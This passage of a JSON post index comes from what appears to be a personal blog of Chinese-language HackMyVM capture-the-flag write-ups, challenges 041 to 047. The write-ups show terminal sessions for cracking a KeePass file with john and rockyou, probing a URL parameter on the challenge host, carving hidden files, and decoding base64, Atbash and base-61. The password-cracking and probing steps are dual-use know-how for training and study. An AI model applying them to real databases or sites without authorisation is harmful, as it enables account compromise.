{"htmlDir": "docs/post/Challenge 041.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 041", "postUrl": "post/Challenge%20041.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/52", "commentNum": 0, "wordCount": 1665, "description": "![image-20250617112622882](https://7r1umphk.github.io/image/20250617112623238.webp)\n\n\u4e0b\u8f7d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ll 041.zip \n-rwxr-xr-x 1 kali kali 1824 Jun 16 23:26 041.zip\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 041.zip \nArchive:  041.zip\n extracting: Challenge.kdbx          \n               \n```\n\n**KeePass** \u6570\u636e\u5e93\u6587\u4ef6\n\n\u5e94\u8be5\u662f\u7834\u89e3\u5bc6\u7801\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ keepass2john Challenge.kdbx > hash    \n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (KeePass [SHA256 AES 32/64])\nCost 1 (iteration count) is 2542373 for all loaded hashes\nCost 2 (version) is 2 for all loaded hashes\nCost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\namigos           (Challenge)     \n1g 0:00:00:51 DONE (2025-06-16 23:29) 0.01944g/s 9.953p/s 9.953c/s 9.953C/s teiubesc..letmein\nUse the '--show' option to display all of the cracked passwords reliably\nSession completed. \n                      \n```\n\n\u6309\u4e2aKeePass\u5ba2\u6237\u7aef\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ sudo apt install keepassxc\n```\n\n![image-20250617113119656](https://7r1umphk.github.io/image/20250617113120073.webp)\n\n```\nHMV{EasyPeasyMoney}\n```\n\nsentence", "top": 0, "createdAt": 1751016624, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P53": {"htmlDir": "docs/post/Challenge 042.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 042", "postUrl": "post/Challenge%20042.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/53", "commentNum": 0, "wordCount": 2164, "description": "![image-20250617113152195](https://7r1umphk.github.io/image/20250617113152556.webp)\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ curl -i http://momo.hackmyvm.eu/n1lsfr4hm/\nHTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: Tue, 17 Jun 2025 04:02:26 GMT\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nConnection: keep-alive\n\n\n<a href='/index.php?user=1'>John</a>\n<a href='/index.php?user=2'>Monroe</a>\n<a href='/index.php?user=3'>Vault</a>\n<a href='/index.php?user=4'>{</a>\n<a href='/index.php?user=6'>Wesley</a>\n<a href='/index.php?user=7'>Teresa</a>\n<a href='/index.php?user=8'>Fredric</a>\n<a href='/index.php?user=9'>}</a>\n                            \n```\n\n\u5c11\u4e2a5\n\n\u8bbf\u95ee\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ curl -i http://momo.hackmyvm.eu/n1lsfr4hm/index.php?user=5\nHTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: Tue, 17 Jun 2025 04:03:26 GMT\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nConnection: keep-alive\n\n\n<a href='/index.php?user=1'>John</a>\n<a href='/index.php?user=2'>Monroe</a>\n<a href='/index.php?user=3'>Vault</a>\n<a href='/index.php?user=4'>{</a>\n<a href='/index.php?user=6'>Wesley</a>\n<a href='/index.php?user=7'>Teresa</a>\n<a href='/index.php?user=8'>Fredric</a>\n<a href='/index.php?user=9'>}</a>\n<br><br><br>o_O                                                                                  \n```\n\n\u6ca1\u63d0\u793a\uff0c\u7136\u540e\u5c31\u8bd5\u5457\n\n10\u6ca1\u4e1c\u897f\n\n11-20\u544a\u8bc9\u6211\u4eec\u6ca1\u6709\u529e\u6cd5\n\n0\u6ca1\u6709\u4e1c\u897f\n\n-1\u663e\u793a\u4e86flag\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ curl -i http://momo.hackmyvm.eu/n1lsfr4hm/index.php?user=-1\nHTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: Tue, 17 Jun 2025 04:08:37 GMT\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nConnection: keep-alive\n\n\n<a href='/index.php?user=1'>John</a>\n<a href='/index.php?user=2'>Monroe</a>\n<a href='/index.php?user=3'>Vault</a>\n<a href='/index.php?user=4'>{</a>\n<a href='/index.php?user=6'>Wesley</a>\n<a href='/index.php?user=7'>Teresa</a>\n<a href='/index.php?user=8'>Fredric</a>\n<a href='/index.php?user=9'>}</a>\n<br><br><br>HMV{fcknumbers}                                                                                                                                                                                   \n```\n\nsentence", "top": 0, "createdAt": 1751016627, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P54": {"htmlDir": "docs/post/Challenge 043.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 043", "postUrl": "post/Challenge%20043.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/54", "commentNum": 0, "wordCount": 803, "description": "![image-20250617121018302](https://7r1umphk.github.io/image/20250617121018691.webp)\n\n\u4ece\u6b64 MS Excel \u6587\u4ef6\u4e2d\u6355\u83b7\u6807\u5fd7\u3002\n\n\u90a3\u4e0b\u8f7d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ll 043.zip \n-rwxr-xr-x 1 kali kali 14095 Jun 17 00:10 043.zip\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 043.zip \nArchive:  043.zip\n  inflating: Challenge.xlsm          \n                   \n```\n\n![image-20250617121204452](https://7r1umphk.github.io/image/20250617121204745.webp)\n\n\u6709\u5b8f\uff0c\u770b\u4e00\u4e0b\n\n\u54c8\uff0c\u770b\u4e0d\u4e86\u5185\u5bb9\uff0c\u90a3\u53bbkali\u6267\u884c\u4e00\u4e0b\u5427\uff08\u5b8f\u53ef\u4ee5\u5f39shell\u6240\u4ee5\u5c0f\u5fc3\u4e00\u70b9\uff09\n\n\u7136\u540e\u6ca1\u6267\u884c\uff0c\u6211\u6252\u62c9\u51fa\u6765\u4e86\uff0c\u54c8\u54c8\u54c8\n\n![image-20250617121717005](https://7r1umphk.github.io/image/20250617121717432.webp)\n\n```\nHMV{b63ce4efbf0b4214a470a707d34bc3ba}\n```\n\nsentence", "top": 0, "createdAt": 1751016630, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P55": {"htmlDir": "docs/post/Challenge 044.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 044", "postUrl": "post/Challenge%20044.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/55", "commentNum": 0, "wordCount": 317, "description": "![image-20250617121752851](https://7r1umphk.github.io/image/20250617121753191.webp)\n\n```\nWhat type of format corresponds to the following address: bc1qspg3vsx3pphrf[...] Flag: HMV{format}\n\n\u4ee5\u4e0b\u5730\u5740\u5bf9\u5e94\u7684\u683c\u5f0f\u7c7b\u578b\u4e3a\uff1abc1qspg3vsx3pphrf[...] \u6807\u5fd7\uff1aHMV{format}\n```\n\nbc1\u4e00\u79cd\u52a0\u5bc6\u8d27\u5e01\uff08**Bitcoin**\uff09\u7684\u524d\u7f00\u683c\u5f0f\n\n\u7136\u540e\u8fd9\u79cd\u5730\u5740\u662f\u4f7f\u7528Bech32 \u7f16\u7801\u65b9\u6848\n\n```\nHMV{Bech32}\n```\n\nsentence", "top": 0, "createdAt": 1751016633, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P56": {"htmlDir": "docs/post/Challenge 045.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 045", "postUrl": "post/Challenge%20045.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/56", "commentNum": 0, "wordCount": 8083, "description": "![image-20250617122237188](https://7r1umphk.github.io/image/20250617122237544.webp)\n\n\u4e0b\u8f7d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ll 045.zip                     \n-rwxr-xr-x 1 kali kali 83848 Jun 17 00:22 045.zip\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 045.zip \nArchive:  045.zip\n  inflating: image.png               \n     \n```\n\n![image](https://7r1umphk.github.io/image/20250617122346695.webp)\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ 7z x 045.zip \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 83848 bytes (82 KiB)\n\nExtracting archive: 045.zip\n--\nPath = 045.zip\nType = zip\nPhysical Size = 83848\n\n    \nWould you like to replace the existing file:\n  Path:     ./image.png\n  Size:     79263 bytes (78 KiB)\n  Modified: 2023-12-15 11:59:40\nwith the file from archive:\n  Path:     image.png\n  Size:     79263 bytes (78 KiB)\n  Modified: 2023-12-15 11:59:39\n? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y\n\nEverything is Ok\n\nSize:       79263\nCompressed: 83848\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ file 045.zip                                                                                                        \n045.zip: Zip archive data, made by v6.3 UNIX, extract using at least v2.0, last modified Dec 15 2023 10:59:40, uncompressed size 79263, method=deflate\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ file image.png  \nimage.png: PNG image data, 304 x 481, 8-bit/color RGBA, non-interlaced\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ exiftool image.png \nExifTool Version Number         : 13.25\nFile Name                       : image.png\nDirectory                       : .\nFile Size                       : 79 kB\nFile Modification Date/Time     : 2023:12:15 10:59:39-05:00\nFile Access Date/Time           : 2025:06:17 00:24:11-04:00\nFile Inode Change Date/Time     : 2023:12:15 10:59:39-05:00\nFile Permissions                : -rwxr-xr-x\nFile Type                       : PNG\nFile Type Extension             : png\nMIME Type                       : image/png\nImage Width                     : 304\nImage Height                    : 481\nBit Depth                       : 8\nColor Type                      : RGB with Alpha\nCompression                     : Deflate/Inflate\nFilter                          : Adaptive\nInterlace                       : Noninterlaced\nPixels Per Unit X               : 3780\nPixels Per Unit Y               : 3780\nPixel Units                     : meters\nImage Size                      : 304x481\nMegapixels                      : 0.146\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ stegseek image.png \nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n\n[!] error: the file format of the file 'image.png' is not supported.\n                                   \n```\n\nstrings\u7784\u4e86\u4e00\u4e0b\n\n\u5e76\u4e14\u62ffbinwalk\u9a8c\u8bc1\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ binwalk 045.zip\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             Zip archive data, at least v2.0 to extract, compressed size: 79069, uncompressed size: 79263, name: image.png\n79108         0x13504         PNG image, 400 x 300, 8-bit/color RGBA, non-interlaced\n79644         0x1371C         Zlib compressed data, best compression\n83826         0x14772         End of Zip archive, footer length: 22\n\n           \n```\n\n\u5b83\u585e\u4e86\u70b9\u4e1c\u897f\n\n\u8bd5\u4e86\u4e00\u4e0bbinwalk\u4e0d\u884c\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ binwalk --extract 045.zip\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             Zip archive data, at least v2.0 to extract, compressed size: 79069, uncompressed size: 79263, name: image.png\n79644         0x1371C         Zlib compressed data, best compression\n\nWARNING: One or more files failed to extract: either no utility was found or it's unimplemented\n\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cd _045.zip.extracted \n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/_045.zip.extracted]\n\u2514\u2500$ ls -al\ntotal 650\ndrwxr-xr-x 1 kali kali      0 Jun 17 00:44 .\ndrwxr-xr-x 1 kali kali  16384 Jun 17 00:44 ..\n-rwxr-xr-x 1 kali kali  83848 Jun 17 00:44 0.zip\n-rwxr-xr-x 1 kali kali 480300 Jun 17 00:44 1371C\n-rwxr-xr-x 1 kali kali   4204 Jun 17 00:44 1371C.zlib\n-rwxr-xr-x 1 kali kali  79263 Dec 15  2023 image.png\n                                      \n```\n\n\u90a3\u62ffforemost\u8bd5\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ foremost 045.zip       \nProcessing: 045.zip\n\ufffd\ufffd\ufffd2\ufffd\ufffdH\u0220m\ufffdI\ufffd\ufffdR\ufffd\ufffdu\ufffd\ufffd\ufffd2k\ufffd\ufffd,\ufffd\ufffdh\ufffd2\ufffd\ufffd\ufffd6m\ufffd}:\ufffdg\ufffd10d\ufffd\ufffd\ufffd\ufffd^\u0730\u044co\ufffd\ufffdM\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u05f6\ufffd\ufffd\ufffdy\ufffds\ufffdy\ufffd\ufffd\ufffd\ufffdso\ufffd{M\ufffd{\ufffd\ufffd(IHH\ufffd(\ufffd\ufffd&!!\ufffd\ufffd\ufffd\ufffd7\ufffdO\ufffdR|\ufffd\ufffd;\ufffdA\ufffd\ufffd\ufffdi\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdD\ufffd\ufffdk\ufffdOf\ufffdM\ufffd\ufffd\ufffd\n              +)\ufffd\ufffd\ufffdd\ufffd\ufffd\ufffdn\ufffd+\ufffd\ufffd\ufffd\ufffdW\ufffd\ufffd\ufffd\ufffd\ufffd\n*|\n           \n```\n\n???\n\n\u91cd\u65b0\u4e0b\u4e00\u904d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ foremost 045.zip\nERROR: /mnt/hgfs/gx/output is not empty\n        Please specify another directory or run with -T.\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ rm -rf /mnt/hgfs/gx/output\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ foremost 045.zip          \nProcessing: 045.zip\n\ufffd\ufffd\ufffd2\ufffd\ufffdH\u0220m\ufffdI\ufffd\ufffdR\ufffd\ufffdu\ufffd\ufffd\ufffd2k\ufffd\ufffd,\ufffd\ufffdh\ufffd2\ufffd\ufffd\ufffd6m\ufffd}:\ufffdg\ufffd10d\ufffd\ufffd\ufffd\ufffd^\u0730\u044co\ufffd\ufffdM\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u05f6\ufffd\ufffd\ufffdy\ufffds\ufffdy\ufffd\ufffd\ufffd\ufffdso\ufffd{M\ufffd{\ufffd\ufffd(IHH\ufffd(\ufffd\ufffd&!!\ufffd\ufffd\ufffd\ufffd7\ufffdO\ufffdR|\ufffd\ufffd;\ufffdA\ufffd\ufffd\ufffdi\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdD\ufffd\ufffdk\ufffdOf\ufffdM\ufffd\ufffd\ufffd\n              +)\ufffd\ufffd\ufffdd\ufffd\ufffd\ufffdn\ufffd+\ufffd\ufffd\ufffd\ufffdW\ufffd\ufffd\ufffd\ufffd\ufffd\n*|\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cd output \n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/output]\n\u2514\u2500$ ls -al\ntotal 21\ndrwxr-xr-x 1 kali kali  4096 Jun 17 00:47 .\ndrwxr-xr-x 1 kali kali 16384 Jun 17 00:47 ..\n-rwxr-xr-x 1 kali kali   719 Jun 17 00:47 audit.txt\ndrwxr-xr-x 1 kali kali     0 Jun 17 00:47 png\ndrwxr-xr-x 1 kali kali     0 Jun 17 00:47 zip\n                                   \n```\n\nok\uff0c\u662f\u6211\u663e\u793a\u7684\u95ee\u9898\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/output]\n\u2514\u2500$ cd png       \n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/output/png]\n\u2514\u2500$ ls -al\ntotal 9\ndrwxr-xr-x 1 kali kali    0 Jun 17 00:47 .\ndrwxr-xr-x 1 kali kali 4096 Jun 17 00:47 ..\n-rwxr-xr-x 1 kali kali 4618 Jun 17 00:47 00000154.png\n                                   \n```\n\n![00000154](https://7r1umphk.github.io/image/20250617125120923.webp)\n\n```\nHMV{undercover}\n```\n\nsentence", "top": 0, "createdAt": 1751016635, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P57": {"htmlDir": "docs/post/Challenge 046.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 046", "postUrl": "post/Challenge%20046.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/57", "commentNum": 0, "wordCount": 2465, "description": "\u6682\u65f6\u6ca1\u4e8b\u5e72\uff0c\u5237\u4e00\u4e0b\u6311\u6218\n\n![image-20250621073717593](https://7r1umphk.github.io/image/20250621073717886.webp)\n\n\u4e0b\u8f7d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 046.zip         \nArchive:  046.zip\n  inflating: 046.txt                 \n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat -A 046.txt \nx=W0oyRmlZMlJsWm1kb2FXcHJiRzF1YjNCeGNuTjBkWFozZUhsNlFVSkRSRVZHUjBoSlNrdE1UVTVQVUZGU1UxUlZWbGRZV1ZvbklDZDZlWGgzZG5WMGMzSnhjRzl1Yld4cm;y=FtbG9aMlpsWkdOaVlWcFpXRmRXVlZSVFVsRlFUMDVOVEV0S1NVaEhSa1ZFUTBKQkp3bz0sIEhWMUR2M1FvQjNFYngyb2V5bTBQXQo=;x+y^M$\n^M$\n^M$\n^M$\n^M$\n```\n\n\u76ee\u6d4b\u662fbase64\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ echo -n 'W0oyRmlZMlJsWm1kb2FXcHJiRzF1YjNCeGNuTjBkWFozZUhsNlFVSkRSRVZHUjBoSlNrdE1UVTVQVUZGU1UxUlZWbGRZV1ZvbklDZDZlWGgzZG5WMGMzSnhjRzl1Yld4cm' | wc -c\n130\n          \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ echo -n 'FtbG9aMlpsWkdOaVlWcFpXRmRXVlZSVFVsRlFUMDVOVEV0S1NVaEhSa1ZFUTBKQkp3bz0sIEhWMUR2M1FvQjNFYngyb2V5bTBQXQo=' | wc -c                            \n102\n \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ echo -n 'W0oyRmlZMlJsWm1kb2FXcHJiRzF1YjNCeGNuTjBkWFozZUhsNlFVSkRSRVZHUjBoSlNrdE1UVTVQVUZGU1UxUlZWbGRZV1ZvbklDZDZlWGgzZG5WMGMzSnhjRzl1Yld4cmFtbG9aMlpsWkdOaVlWcFpXRmRXVlZSVFVsRlFUMDVOVEV0S1NVaEhSa1ZFUTBKQkp3bz0sIEhWMUR2M1FvQjNFYngyb2V5bTBQXQo=' | base64 -d\n[J2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVonICd6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYVpZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBJwo=, HV1Dv3QoB3Ebx2oeym0P]\n  \n```\n\nJ2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVonICd6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYVpZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBJwo=\n\nHV1Dv3QoB3Ebx2oeym0P\n\n\u5148\u89e3\u7b2c\u4e00\u6bb5\n\n```\u7136\u540e\u6709\u70b9\u62bd\u8c61\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ echo -n 'J2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVonICd6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYVpZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBJwo=' | base64 -d \n'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' 'zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA'\n```\n\n\u8fd9\u660e\u663e\u662f\u4e00\u4e2a **\u5b57\u7b26\u6620\u5c04\u8868**\uff0c\u4e5f\u5c31\u662f\u7528\u4e8e **\u7b80\u5355\u66ff\u6362\u52a0\u5bc6**\u7684\n\n\u5de6\u8fb9\u662f\u660e\u6587\u5b57\u7b26\u96c6\uff08\u5c0f\u5199+\u5927\u5199\uff09\uff1a\n\n```\nabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\n```\n\n\u53f3\u8fb9\u662f\u5bf9\u5e94\u7684\u5bc6\u6587\u5b57\u7b26\u6620\u5c04\uff08\u5373\uff1a\u5012\u5e8f\uff09\uff1a\n\n```\nzyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA\n```\n\n\u6362\u53e5\u8bdd\u8bf4\uff0c\u8fd9\u662f\u4e00\u4e2a **Atbash Cipher**\n\n\u90a3\u4f60\u53ef\u4ee5\u76f4\u63a5\u62ff\u53bbCyberChef\u4e86\n\n![image-20250621123721248](https://7r1umphk.github.io/image/20250621123721628.webp)\n\n\u8fd9\u6837\u5c31\u51faflag\u4e86\n\n```\nHMV{recursion}\n```\n\nsentence", "top": 0, "createdAt": 1751016638, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P58": {"htmlDir": "docs/post/Challenge 047.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 047", "postUrl": "post/Challenge%20047.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/58", "commentNum": 0, "wordCount": 2800, "description": "![image-20250621124138454](https://7r1umphk.github.io/image/20250621124138743.webp)\n\n```\n<pre> magic_num_list = [12, 43, 36, 47, 21, 40, 23, 42, 14, 54, 10, 53, 14, 36, 32, 40, 28, 50, 22, 40] Hint: Use python code for decoding the magic_num_list... </pre>\n```\n\n\u4e0b\u8f7d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 47.zip \nArchive:  47.zip\n  inflating: 47.py                   \n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat 47.       \ncat: 47.: No such file or directory\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat 47.py \nimport string\n\ndef magic_encode(flag):\n    flag, magic_num_list = divmod(flag, 61)\n    return f'{string.digits[1:] + string.ascii_uppercase + string.ascii_lowercase}' [magic_num_list]                                                                                               \n```\n\n61 \u8fdb\u5236\u6620\u5c04\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat 47p.py \nimport string\n\nbase61_table = string.digits[1:] + string.ascii_uppercase + string.ascii_lowercase\nmagic_num_list = [12, 43, 36, 47, 21, 40, 23, 42, 14, 54, 10, 53, 14, 36, 32, 40, 28, 50, 22, 40]\n\ndecoded = ''.join(base61_table[i] for i in magic_num_list)\nprint(decoded)\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ python3 $_\nDibmMfOhFtBsFbXfTpNf\n  \n```\n\n\u4f46\u662f\u6211\u62ff\u53bb\u4ea4\uff0c\u9519\u7684\n\n\u90a3\u5c31\u6709\u4e00\u79cd\u53ef\u80fd\u4e86\uff0c\u7f16\u7801\u8868\u7684\u987a\u5e8f\u53ef\u80fd\u6709\u95ee\u9898\n\n\u6211\u4eec\u76f4\u63a5\u7206\u7834\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat 47p.py\nimport string\n\nmagic_num_list = [12, 43, 36, 47, 21, 40, 23, 42, 14, 54, 10, 53, 14, 36, 32, 40, 28, 50, 22, 40]\n\ntables = {\n    'digits[1:] + uppercase + lowercase': string.digits[1:] + string.ascii_uppercase + string.ascii_lowercase,\n    'digits + lowercase + uppercase': string.digits + string.ascii_lowercase + string.ascii_uppercase,\n    'digits + uppercase + lowercase': string.digits + string.ascii_uppercase + string.ascii_lowercase,\n    'uppercase + lowercase + digits': string.ascii_uppercase + string.ascii_lowercase + string.digits,\n}\n\nfor name, table in tables.items():\n    try:\n        decoded = ''.join(table[i] for i in magic_num_list)\n        print(f'{name} --> {decoded}')\n    except IndexError:\n        print(f'{name} --> IndexError: \u8868\u957f\u5ea6\u4e0d\u8db3')\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ python3 $_\ndigits[1:] + uppercase + lowercase --> DibmMfOhFtBsFbXfTpNf\ndigits + lowercase + uppercase --> cHALlEnGeSaReAwEsOmE\ndigits + uppercase + lowercase --> ChalLeNgEsArEaWeSoMe\nuppercase + lowercase + digits --> MrkvVoXqO2K1OkgocyWo\n                                                 \n```\n\n\u4e00\u4e2a\u4e2a\u8bd5\n\n\u8fd9\u4e2a\u662f\u5bf9\u7684cHALlEnGeSaReAwEsOmE\n\n```\nHMV{cHALlEnGeSaReAwEsOmE}\n```\n\nsentence", "top": 0, "createdAt": 1751016641, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P59": {"htmlDir": "docs/post/Challenge 